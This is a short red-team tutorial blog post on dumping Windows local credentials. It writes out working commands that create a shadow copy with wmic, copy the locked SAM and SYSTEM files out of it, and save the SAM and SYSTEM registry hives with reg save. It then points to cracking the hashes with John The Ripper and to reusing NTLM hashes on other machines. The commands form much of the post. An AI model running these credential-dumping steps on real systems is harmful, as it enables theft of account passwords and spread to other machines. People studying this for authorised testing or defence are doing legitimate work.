---
title:  "Windows Credentials-SAM Database part-1"
classes: wide
header:
  teaser: /img/redteampng.png
ribbon: red
description: "Windows Credentials-SAM Database part-1"
categories:
  - Red-Teaming
toc: true
---

## Introduction to SAM 
Local Windows credentials are stored in the Security Account Manager (SAM) database as password hashes using the NTLM hashing format, which is based on the MD4 algorithm.

We can reuse acquired NTLM hashes to authenticate to a different machine, as long as the hash is tied to a user account and password registered on that machine

It is the responsibility of LSA (Local Security Authority) to verify user login by matching the passwords with the database maintained in SAM.

SAM starts running in the background as soon as the Windows boots up.

located at C:\Windows\System32\config\SAM
but the SYSTEM process has an exclusive lock on it, preventing us from reading or copying it even from an administrative command prompt

 Failure to copy the SAM database
```
copy c:\Windows\System32\config\sam C:\Users\nored0x\Downloads\sam
```
<img src="/img/cred1/1.PNG" alt="Getting-gz" width="800" height="200"> 
 
There are two potential workarounds. 
 * First, we could use the Volume Shadow Copy Server, which can create a snapshot (or “shadow volume”) of the local hard drive with vssadmin,
 * The second approach, which will work on our Windows 10 machine, is to execute this option through WMIC launched from an administrative command prompt.
Specifically, we’ll launch wmic, specify the shadowcopy class, create a new shadow volume and specify the source drive with “Volume=‘C:\’”. This will create a snapshot of the C drive.
 
 
Creating a shadow volume
```
 wmic shadowcopy call create Volume='C:\'
 ```
 <img src="/img/cred1/2.PNG" alt="Getting-gz" width="800" height="200"> 

To verify this
 ```
- Listing shadow volumes
 ```
  <img src="/img/cred1/3.PNG" alt="Getting-gz" width="800" height="200"> 



Shadow copying the SAM database
```
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\system32\config\sam C:\users\nored0x\Downloads\sam
```

 <img src="/img/cred1/4.PNG" alt="Getting-gz" width="800" height="200"> 


The encryption keys are stored in the SYSTEM file, which is in the same folder as the SAM database. However, it is also locked by the SYSTEM account

Shadow copying the SYSTEM file

```
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\system32\config\system C:\users\nored0x\Downloads\system
```

<img src="/img/cred1/5.PNG" alt="Getting-gz" width="800" height="200"> 


```
reg save HKLM\sam C:\users\nored0x\Downloads\sam
```
<img src="/img/cred1/6.PNG" alt="Getting-gz" width="800" height="200"> 
```
reg save HKLM\system C:\users\nored0x\Desktop\system
```
<img src="/img/cred1/7.PNG" alt="Getting-gz" width="800" height="200"> 






## Decrypting Hash
John The Ripper